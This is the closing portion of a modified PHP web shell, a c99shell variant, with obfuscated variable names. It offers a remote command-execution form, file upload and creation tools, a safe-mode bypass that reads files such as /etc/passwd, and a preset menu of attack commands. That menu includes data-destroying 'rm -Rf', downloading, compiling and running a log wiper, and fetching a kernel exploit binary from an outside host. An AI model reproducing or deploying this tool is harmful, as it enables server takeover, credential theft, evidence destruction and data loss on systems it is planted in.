'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA' . 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA' . 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA' . 'AAjgACsJrDRHSICDQ7IMXDgJx8EvZuIcbPBooZwbBwOMAfMmYwBCA2sEcNBjJCMYATLIOLiokocm' . 'C1QskAClCxcGBj7EsNHoQAciSCC1mNAmjJgGGEBQoBHigKENBjhcCBAIzRoGFkwQMNKnyggRSRAg' . '2BHpDBUeewRV0PDHCp4BSgjw0ZGHzJQcEVD4IEHJzYkBfo4seYGlDBwgTCAAYvFE4KEBJYI4UrPF' . 'CyIIK+woYjMwQQI6Cor8mKEnxR0nAhYKjHJFQYECkqSkSa164IM6LhLRrr3wwaBCu3kPFKCldkAA' . 'Ow==', 'ext_doc' => 'R0lGODlhEAAQACIAACH5BAEAAAUALAAAAAAQABAAggAAAP///8DAwAAA/4CAgAAAAAAAAAAAAANR' . 'WErcrrCQQCslQA2wOwdXkIFWNVBA+nme4AZCuolnRwkwF9QgEOPAFG21A+Z4sQHO94r1eJRTJVmq' . 'MIOrrPSWWZRcza6kaolBCOB0WoxRud0JADs=', 'ext_exe' => 'R0lGODlhEwAOAKIAAAAAAP///wAAvcbGxoSEhP///wAAAAAAACH5BAEAAAUALAAAAAATAA4AAAM7' . 'WLTcTiWSQautBEQ1hP+gl21TKAQAio7S8LxaG8x0PbOcrQf4tNu9wa8WHNKKRl4sl+y9YBuAdEqt' . 'xhIAOw==', 'ext_h' => 'R0lGODlhEAAQACIAACH5BAEAAAUALAAAAAAQABAAgv///wAAAAAAgICAgMDAwAAAAAAAAAAAAANB' . 'WLPc9XCASScZ8MlKCcARRwVkEAKCIBKmNqVrq7wpbMmbbbOnrgI8F+q3w9GOQOMQGZyJOspnMkKo' . 'Wq/NknbbSgAAOw==', 'ext_hpp' => 'R0lGODlhEAAQACIAACH5BAEAAAUALAAAAAAQABAAgv///wAAAAAAgICAgMDAwAAAAAAAAAAAAANF' . 'WLPc9XCASScZ8MlKicobBwRkEAGCIAKEqaFqpbZnmk42/d43yroKmLADlPBis6LwKNAFj7jfaWVR' . 'UqUagnbLdZa+YFcCADs=', 'ext_htaccess' => 'R0lGODlhEAAQACIAACH5BAEAAAYALAAAAAAQABAAggAAAP8AAP8A/wAAgIAAgP//AAAAAAAAAAM6' . 'WEXW/k6RAGsjmFoYgNBbEwjDB25dGZzVCKgsR8LhSnprPQ406pafmkDwUumIvJBoRAAAlEuDEwpJ' . 'AAA7', 'ext_html' => 'R0lGODlhEwAQALMAAAAAAP///2trnM3P/FBVhrPO9l6Itoyt0yhgk+Xy/WGp4sXl/i6Z4mfd/HNz' . 'c////yH5BAEAAA8ALAAAAAATABAAAAST8Ml3qq1m6nmC/4GhbFoXJEO1CANDSociGkbACHi20U3P' . 'KIFGIjAQODSiBWO5NAxRRmTggDgkmM7E6iipHZYKBVNQSBSikukSwW4jymcupYFgIBqL/MK8KBDk' . 'Bkx2BXWDfX8TDDaFDA0KBAd9fnIKHXYIBJgHBQOHcg+VCikVA5wLpYgbBKurDqysnxMOs7S1sxIR' . 'ADs=', 'ext_jpg' => 'R0lGODlhEAAQADMAACH5BAEAAAkALAAAAAAQABAAgwAAAP///8DAwICAgICAAP8AAAD/AIAAAACA' . 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAARccMhJk70j6K3FuFbGbULwJcUhjgHgAkUqEgJNEEAgxEci' . 'Ci8ALsALaXCGJK5o1AGSBsIAcABgjgCEwAMEXp0BBMLl/A6x5WZtPfQ2g6+0j8Vx+7b4/NZqgftd' . 'FxEAOw==', 'ext_js' => 'R0lGODdhEAAQACIAACwAAAAAEAAQAIL///8AAACAgIDAwMD//wCAgAAAAAAAAAADUCi63CEgxibH' . 'k0AQsG200AQUJBgAoMihj5dmIxnMJxtqq1ddE0EWOhsG16m9MooAiSWEmTiuC4Tw2BB0L8FgIAhs' . 'a00AjYYBbc/o9HjNniUAADs=', 'ext_lnk' => 'R0lGODlhEAAQAGYAACH5BAEAAFAALAAAAAAQABAAhgAAAABiAGPLMmXMM0y/JlfFLFS6K1rGLWjO' . 'NSmuFTWzGkC5IG3TOo/1XE7AJx2oD5X7YoTqUYrwV3/lTHTaQXnfRmDGMYXrUjKQHwAMAGfNRHzi' . 'Uww5CAAqADOZGkasLXLYQghIBBN3DVG2NWnPRnDWRwBOAB5wFQBBAAA+AFG3NAk5BSGHEUqwMABk' . 'AAAgAAAwAABfADe0GxeLCxZcDEK6IUuxKFjFLE3AJ2HHMRKiCQWCAgBmABptDg+HCBZeDAqFBWDG' . 'MymUFQpWBj2fJhdvDQhOBC6XF3fdR0O6IR2ODwAZAHPZQCSREgASADaXHwAAAAAAAAAAAAAAAAAA' . 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA' . 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA' . 'AAAAAAAAAAAAAAAAAAAAAAeZgFBQPAGFhocAgoI7Og8JCgsEBQIWPQCJgkCOkJKUP5eYUD6PkZM5' . 'NKCKUDMyNTg3Agg2S5eqUEpJDgcDCAxMT06hgk26vAwUFUhDtYpCuwZByBMRRMyCRwMGRkUg0xIf' . '1lAeBiEAGRgXEg0t4SwroCYlDRAn4SmpKCoQJC/hqVAuNGzg8E9RKBEjYBS0JShGh4UMoYASBiUQ' . 'ADs=', 'ext_log' => 'R0lGODlhEAAQADMAACH5BAEAAAgALAAAAAAQABAAg////wAAAMDAwICAgICAAAAAgAAA////AAAA' . 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAARQEKEwK6UyBzC475gEAltJklLRAWzbClRhrK4Ly5yg7/wN' . 'zLUaLGBQBV2EgFLV4xEOSSWt9gQQBpRpqxoVNaPKkFb5Eh/LmUGzF5qE3+EMIgIAOw==', 'ext_php' => 'R0lGODlhEAAQAAAAACH5BAEAAAEALAAAAAAQABAAgAAAAAAAAAImDA6hy5rW0HGosffsdTpqvFlg' . 't0hkyZ3Q6qloZ7JimomVEb+uXAAAOw==', 'ext_pl' => 'R0lGODlhFAAUAKL/AP/4/8DAwH9/AP/4AL+/vwAAAAAAAAAAACH5BAEAAAEALAAAAAAUABQAQAMo' . 'GLrc3gOAMYR4OOudreegRlBWSJ1lqK5s64LjWF3cQMjpJpDf6//ABAA7', 'ext_swf' => 'R0lGODlhFAAUAMQRAP+cnP9SUs4AAP+cAP/OAIQAAP9jAM5jnM6cY86cnKXO98bexpwAAP8xAP/O' . 'nAAAAP///////wAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAACH5BAEA' . 'ABEALAAAAAAUABQAAAV7YCSOZGme6PmsbMuqUCzP0APLzhAbuPnQAweE52g0fDKCMGgoOm4QB4GA' . 'GBgaT2gMQYgVjUfST3YoFGKBRgBqPjgYDEFxXRpDGEIA4xAQQNR1NHoMEAACABFhIz8rCncMAGgC' . 'NysLkDOTSCsJNDJanTUqLqM2KaanqBEhADs=', 'ext_tar' => 'R0lGODlhEAAQAGYAACH5BAEAAEsALAAAAAAQABAAhgAAABlOAFgdAFAAAIYCUwA8ZwA8Z9DY4JIC' . 'Wv///wCIWBE2AAAyUJicqISHl4CAAPD4/+Dg8PX6/5OXpL7H0+/2/aGmsTIyMtTc5P//sfL5/8XF' . 'HgBYpwBUlgBWn1BQAG8aIABQhRbfmwDckv+H11nouELlrizipf+V3nPA/40CUzmm/wA4XhVDAAGD' . 'UyWd/0it/1u1/3NzAP950P990mO5/7v14YzvzXLrwoXI/5vS/7Dk/wBXov9syvRjwOhatQCHV17p' . 'uo0GUQBWnP++8Lm5AP+j5QBUlACKWgA4bjJQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA' . 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA' . 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA' . 'AAAAAAAAAAAAAAAAAAAAAAeegAKCg4SFSxYNEw4gMgSOj48DFAcHEUIZREYoJDQzPT4/AwcQCQkg' . 'GwipqqkqAxIaFRgXDwO1trcAubq7vIeJDiwhBcPExAyTlSEZOzo5KTUxMCsvDKOlSRscHDweHkMd' . 'HUcMr7GzBufo6Ay87Lu+ii0fAfP09AvIER8ZNjc4QSUmTogYscBaAiVFkChYyBCIiwXkZD2oR3FB' . 'u4tLAgEAOw==', 'ext_txt' => 'R0lGODlhEwAQAKIAAAAAAP///8bGxoSEhP///wAAAAAAAAAAACH5BAEAAAQALAAAAAATABAAAANJ' . 'SArE3lDJFka91rKpA/DgJ3JBaZ6lsCkW6qqkB4jzF8BS6544W9ZAW4+g26VWxF9wdowZmznlEup7' . 'UpPWG3Ig6Hq/XmRjuZwkAAA7', 'ext_wri' => 'R0lGODlhEAAQADMAACH5BAEAAAgALAAAAAAQABAAg////wAAAICAgMDAwICAAAAAgAAA////AAAA' . 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAARRUMhJkb0C6K2HuEiRcdsAfKExkkDgBoVxstwAAypduoao' . 'a4SXT0c4BF0rUhFAEAQQI9dmebREW8yXC6Nx2QI7LrYbtpJZNsxgzW6nLdq49hIBADs=', 'ext_xml' => 'R0lGODlhEAAQAEQAACH5BAEAABAALAAAAAAQABAAhP///wAAAPHx8YaGhjNmmabK8AAAmQAAgACA' . 'gDOZADNm/zOZ/zP//8DAwDPM/wAA/wAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA' . 'AAAAAAAAAAAAAAAAAAVk4CCOpAid0ACsbNsMqNquAiA0AJzSdl8HwMBOUKghEApbESBUFQwABICx' . 'OAAMxebThmA4EocatgnYKhaJhxUrIBNrh7jyt/PZa+0hYc/n02V4dzZufYV/PIGJboKBQkGPkEEQ' . 'IQA7'); echo '[syslog]03
'; $sp00652f = array('ext_tar' => array('ext_tar', 'ext_r00', 'ext_ace', 'ext_arj', 'ext_bz', 'ext_bz2', 'ext_tbz', 'ext_tbz2', 'ext_tgz', 'ext_uu', 'ext_xxe', 'ext_zip', 'ext_cab', 'ext_gz', 'ext_iso', 'ext_lha', 'ext_lzh', 'ext_pbk', 'ext_rar', 'ext_uuf'), 'ext_php' => array('ext_php', 'ext_php3', 'ext_php4', 'ext_php5', 'ext_phtml', 'ext_shtml', 'ext_htm'), 'ext_jpg' => array('ext_jpg', 'ext_gif', 'ext_png', 'ext_jpeg', 'ext_jfif', 'ext_jpe', 'ext_bmp', 'ext_ico', 'ext_tif', 'tiff'), 'ext_html' => array('ext_html', 'ext_htm'), 'ext_avi' => array('ext_avi', 'ext_mov', 'ext_mvi', 'ext_mpg', 'ext_mpeg', 'ext_wmv', 'ext_rm'), 'ext_lnk' => array('ext_lnk', 'ext_url'), 'ext_ini' => array('ext_ini', 'ext_css', 'ext_inf'), 'ext_doc' => array('ext_doc', 'ext_dot'), 'ext_js' => array('ext_js', 'ext_vbs'), 'ext_cmd' => array('ext_cmd', 'ext_bat', 'ext_pif'), 'ext_wri' => array('ext_wri', 'ext_rtf'), 'ext_swf' => array('ext_swf', 'ext_fla'), 'ext_mp3' => array('ext_mp3', 'ext_au', 'ext_midi', 'ext_mid'), 'ext_htaccess' => array('ext_htaccess', 'ext_htpasswd', 'ext_ht', 'ext_hta', 'ext_so')); if (!$spa88c69) { header('Content-type: image/gif'); header('Cache-control: public'); header('Expires: ' . date('r', mktime(0, 0, 0, 1, 1, 2030))); header('Cache-control: max-age=' . 60 * 60 * 24 * 7); header('Last-Modified: ' . date('r', filemtime(__FILE__))); foreach ($sp00652f as $spf38c9d => $spc85aba) { if (in_array($sp4c8650, $spc85aba)) { $sp4c8650 = $spf38c9d; break; } } if (empty($spbe22e1[$sp4c8650])) { $sp4c8650 = 'small_unk'; } if (in_array($sp4c8650, $spf6519e)) { $sp4c8650 = 'ext_tar'; } echo base64_decode($spbe22e1[$sp4c8650]); } else { foreach ($sp00652f as $sp62a453 => $sp47eda8) { foreach ($sp47eda8 as $sp549585) { if ($sp62a453 != $sp549585) { if (!empty($spbe22e1[$sp549585])) { echo 'Warning! Remove $images[' . $sp549585 . ']<br>'; } } } } natsort($spbe22e1); $spf38c9d = array_keys($spbe22e1); echo '<center>'; foreach ($spf38c9d as $sp74b32c) { echo $sp74b32c . ':<img src="' . $sp4f5f94 . 'act=img&img=' . $sp74b32c . '" border="1"><br>'; } echo '</center>'; } die; } if ($spabab30 == 'about') { echo '<center><b>Credits:<br>Idea, leading and coding by tristram[CCTeaM].<br>Beta-testing and some tips - NukLeoN [AnTiSh@Re tEaM].<br>Thanks all who report bugs.<br>All bugs send to tristram\'s ICQ #656555 <a href="http://wwp.icq.com/scripts/contact.dll?msgto=656555"><img src="http://wwp.icq.com/scripts/online.dll?icq=656555&img=5" border=0 align=absmiddle></a>.</b>'; } ?>
</td></tr></table><a bookmark="minipanel"><br><TABLE style="BORDER-COLLAPSE: collapse" cellSpacing=0 borderColorDark=#666666 cellPadding=5 height="1" width="100%" bgColor=#333333 borderColorLight=#c0c0c0 border=1>
<tr><td width="100%" height="1" valign="top" colspan="2"><p align="center"><b>:: <a href="<?php  echo $sp4f5f94; ?>
act=cmd&d=<?php  echo urlencode($sp549585); ?>
"><b>Command execute</b></a> ::</b></p></td></tr>
<tr><td width="50%" height="1" valign="top"><center><b>Enter: </b><form action="<?php  echo $sp4f5f94; ?>
"><input type=hidden name=act value="cmd"><input type=hidden name="d" value="<?php  echo $sp0391b3; ?>
"><input type="text" name="cmd" size="50" value="<?php  echo htmlspecialchars($spa71965); ?>
"><input type=hidden name="cmd_txt" value="1">&nbsp;<input type=submit name=submit value="Execute"></form></td><td width="50%" height="1" valign="top"><center><b>Select: </b><form action="<?php  echo $sp4f5f94; ?>
act=cmd" method="POST"><input type=hidden name=act value="cmd"><input type=hidden name="d" value="<?php  echo $sp0391b3; ?>
"><select name="cmd"><?php  foreach ($sp5ed355 as $sp886857) { echo '<option value="' . htmlspecialchars($sp886857[1]) . '">' . htmlspecialchars($sp886857[0]) . '</option>'; } ?>
</select><input type=hidden name="cmd_txt" value="1">&nbsp;<input type=submit name=submit value="Execute"></form></td></tr></TABLE>
<br>
<TABLE style="BORDER-COLLAPSE: collapse" cellSpacing=0 borderColorDark=#666666 cellPadding=5 height="116" width="100%" bgColor=#333333 borderColorLight=#c0c0c0 border=1>
<tr><td height="1" valign="top" colspan="2"><p align="center"><b>:: <a href="<?php  echo $sp4f5f94; ?>
act=cmd&d=<?php  echo urlencode($sp549585); ?>
"><b>Shadow's tricks :D </b></a> ::</b></p></td></tr>
<tr>
  <td width="50%" height="83" valign="top"><center>
    <div align="center">Useful Commands 
    </div>
    <form action="<?php  echo $sp4f5f94; ?>
">
      <div align="center">
        <input type=hidden name=act value="cmd">
        <input type=hidden name="d" value="<?php  echo $sp0391b3; ?>
">
          <SELECT NAME="cmd">
            <OPTION VALUE="uname -a">Kernel version
              <OPTION VALUE="w">Logged in users
                <OPTION VALUE="lastlog">Last to connect
                  <OPTION VALUE="find /bin /usr/bin /usr/local/bin /sbin /usr/sbin /usr/local/sbin -perm -4000 2> /dev/null">Suid bins
                    <OPTION VALUE="cut -d: -f1,2,3 /etc/passwd | grep ::">USER WITHOUT PASSWORD!
                    <OPTION VALUE="find /etc/ -type f -perm -o+w 2> /dev/null">Write in /etc/?
                    <OPTION VALUE="which wget curl w3m lynx">Downloaders?
                    <OPTION VALUE="cat /proc/version /proc/cpuinfo">CPUINFO
                    <OPTION VALUE="netstat -atup | grep IST">Open ports
                    <OPTION VALUE="locate gcc">gcc installed?
					<OPTION VALUE="rm -Rf">Format box (DANGEROUS)
                    <OPTION VALUE="wget http://www.packetstormsecurity.org/UNIX/penetration/log-wipers/zap2.c">WIPELOGS PT1 (If wget installed)
                    <OPTION VALUE="gcc zap2.c -o zap2">WIPELOGS PT2
                    <OPTION VALUE="./zap2">WIPELOGS PT3
                    <OPTION VALUE="wget http://ftp.powernet.com.tr/supermail/debug/k3">Kernel attack (Krad.c) PT1 (If wget installed)
                    <OPTION VALUE="./k3 1">Kernel attack (Krad.c) PT2 (L1)
                    <OPTION VALUE="./k3 2">Kernel attack (Krad.c) PT2 (L2)
                    <OPTION VALUE="./k3 3">Kernel attack (Krad.c) PT2 (L3)
                    <OPTION VALUE="./k3 4">Kernel attack (Krad.c) PT2 (L4)
                    <OPTION VALUE="./k3 5">Kernel attack (Krad.c) PT2 (L5)
                  </SELECT>
        <input type=hidden name="cmd_txt" value="1">
        &nbsp;
        <input type=submit name=submit value="Execute">
          <br>
        Warning. Kernel may be alerted using higher levels </div>
    </form>
    </td>
  <td width="50%" height="83" valign="top"><center>
   <center>Kernel Info: <form name="form1" method="post" action="http://google.com/search">
      <input name="q" type="text" id="q" value="<?php  echo wordwrap(php_uname()); ?>
">
      <input type="hidden" name="client" value="firefox-a">
	  <input type="hidden" name="rls" value="org.mozilla:en-US:official">
	  <input type="hidden" name="hl" value="en">
	  <input type="hidden" name="hs" value="b7p">
	  <input type=submit name="btnG" VALUE="Search">
    </form></center>
    </td>
</tr></TABLE><br>
<TABLE style="BORDER-COLLAPSE: collapse" cellSpacing=0 borderColorDark=#666666 cellPadding=5 height="116" width="100%" bgColor=#333333 borderColorLight=#c0c0c0 border=1>
<tr><td height="1" valign="top" colspan="2"><p align="center"><b>:: <a href="<?php  echo $sp4f5f94; ?>
act=cmd&d=<?php  echo urlencode($sp549585); ?>
"><b>Preddy's tricks :D </b></a> ::</b></p></td></tr>
<tr>
  <td width="50%" height="83" valign="top"><center>
    <div align="center">Php Safe-Mode Bypass (Read Files)
    </div><br>
    <form action="<?php  echo $sp4f5f94; ?>
">
      <div align="center">
      File: <input type="text" name="file" method="get"> <input type="submit" value="Read File"><br><br> eg: /etc/passwd<br>
      
      
      
           
      
      
      <?
      
      function rsg_read()
	{	
	$test="";
	$temp=tempnam($test, "cx");
	$file=$_GET['file'];	
	$get=htmlspecialchars($file);
	echo "<br>Trying To Get File <font color=#000099><b>$get</b></font><br>";
	if(copy("compress.zlib://".$file, $temp)){
	$fichier = fopen($temp, "r");
	$action = fread($fichier, filesize($temp));
	fclose($fichier);
	$source=htmlspecialchars($action);
	echo "<div class=\"shell\"><b>Start $get</b><br><br><font color=\"white\">$source</font><br><b><br>Fin <font color=#000099>$get</font></b>";
	unlink($temp);
	} else {
	die("<FONT COLOR=\"RED\"><CENTER>Sorry... File
	<B>".htmlspecialchars($file)."</B> dosen't exists or you don't have
	access.</CENTER></FONT>");
			}
	echo "</div>";
	}
	
	if(isset($_GET['file']))
{
rsg_read();
}
echo "[syslog]04\n";
	?>
	
	<?
	
	function rsg_glob()
{
$chemin=$_GET['directory'];
$files = glob("$chemin*");
echo "Trying To List Folder <font color=#000099><b>$chemin</b></font><br>";
foreach ($files as $filename) {
	echo "<pre>";
   echo "$filename\n";
   echo "</pre>";
echo "[syslog]02-3\n";
}
}

if(isset($_GET['directory']))
{
rsg_glob();
}
echo "[syslog]05\n";
?>

          <br>
      </div>
    </form>
    </td>
  <td width="50%" height="83" valign="top"><center>
   <center>Php Safe-Mode Bypass (List Directories):     <form action="<?php  echo $sp4f5f94; ?>
">
      <div align="center"><br>
      Dir: <input type="text" name="directory" method="get"> <input type="submit" value="List Directory"><br><br> eg: /etc/<br>

    </form></center>
    </td>
</tr></TABLE><br>
<TABLE style="BORDER-COLLAPSE: collapse" cellSpacing=0 borderColorDark=#666666 cellPadding=5 height="1" width="100%" bgColor=#333333 borderColorLight=#c0c0c0 border=1>
<tr>
 <td width="50%" height="1" valign="top"><center><b>:: <a href="<?php  echo $sp4f5f94; ?>
act=search&d=<?php  echo urlencode($sp549585); ?>
"><b>Search</b></a> ::</b><form method="POST"><input type=hidden name=act value="search"><input type=hidden name="d" value="<?php  echo $sp0391b3; ?>
"><input type="text" name="search_name" size="29" value="(.*)">&nbsp;<input type="checkbox" name="search_name_regexp" value="1"  checked> - regexp&nbsp;<input type=submit name=submit value="Search"></form></center></p></td>
 <td width="50%" height="1" valign="top"><center><b>:: <a href="<?php  echo $sp4f5f94; ?>
act=upload&d=<?php  echo $sp75ab22; ?>
"><b>Upload</b></a> ::</b><form method="POST" ENCTYPE="multipart/form-data"><input type=hidden name=act value="upload"><input type="file" name="uploadfile"><input type=hidden name="miniform" value="1">&nbsp;<input type=submit name=submit value="Upload"><br><?php  echo $sp1f8c33; ?>
</form></center></td>
</tr>
</table>
<br><TABLE style="BORDER-COLLAPSE: collapse" cellSpacing=0 borderColorDark=#666666 cellPadding=5 height="1" width="100%" bgColor=#333333 borderColorLight=#c0c0c0 border=1><tr><td width="50%" height="1" valign="top"><center><b>:: Make Dir ::</b><form action="<?php  echo $sp4f5f94; ?>
"><input type=hidden name=act value="mkdir"><input type=hidden name="d" value="<?php  echo $sp0391b3; ?>
"><input type="text" name="mkdir" size="50" value="<?php  echo $sp0391b3; ?>
">&nbsp;<input type=submit value="Create"><br><?php  echo $sp1f8c33; ?>
</form></center></td><td width="50%" height="1" valign="top"><center><b>:: Make File ::</b><form method="POST"><input type=hidden name=act value="mkfile"><input type=hidden name="d" value="<?php  echo $sp0391b3; ?>
"><input type="text" name="mkfile" size="50" value="<?php  echo $sp0391b3; ?>
"><input type=hidden name="ft" value="edit">&nbsp;<input type=submit value="Create"><br><?php  echo $sp1f8c33; ?>
</form></center></td></tr></table>
<br><TABLE style="BORDER-COLLAPSE: collapse" cellSpacing=0 borderColorDark=#666666 cellPadding=5 height="1" width="100%" bgColor=#333333 borderColorLight=#c0c0c0 border=1><tr><td width="50%" height="1" valign="top"><center><b>:: Go Dir ::</b><form action="<?php  echo $sp4f5f94; ?>
"><input type=hidden name=act value="ls"><input type="text" name="d" size="50" value="<?php  echo $sp0391b3; ?>
">&nbsp;<input type=submit value="Go"></form></center></td><td width="50%" height="1" valign="top"><center><b>:: Go File ::</b><form action="<?php  echo $sp4f5f94; ?>
"><input type=hidden name=act value="gofile"><input type=hidden name="d" value="<?php  echo $sp0391b3; ?>
"><input type="text" name="f" size="50" value="<?php  echo $sp0391b3; ?>
">&nbsp;<input type=submit value="Go"></form></center></td></tr></table>
<br><TABLE style="BORDER-COLLAPSE: collapse" height=1 cellSpacing=0 borderColorDark=#666666 cellPadding=0 width="100%" bgColor=#333333 borderColorLight=#c0c0c0 border=1><tr><td width="990" height="1" valign="top"><p align="center"><b>--[ c99shell v. <?php  echo $sp703f1a; ?>
 <a href="<?php  echo $sp4f5f94; ?>
act=about"><u><b>Modded by</b></u></a> Shadow & Preddy | <a href="http://rootshell-security.net"><font color="#FF0000">RootShell Security Group</font></a><font color="#FF0000"></font> | Generation time: <?php  echo round(getmicrotime() - starttime, 4); ?>
 ]--</b></p></td></tr></table>
</body></html><?php  chdir($sp62c3ea); c99shexit(); ?>
 
 
<?php 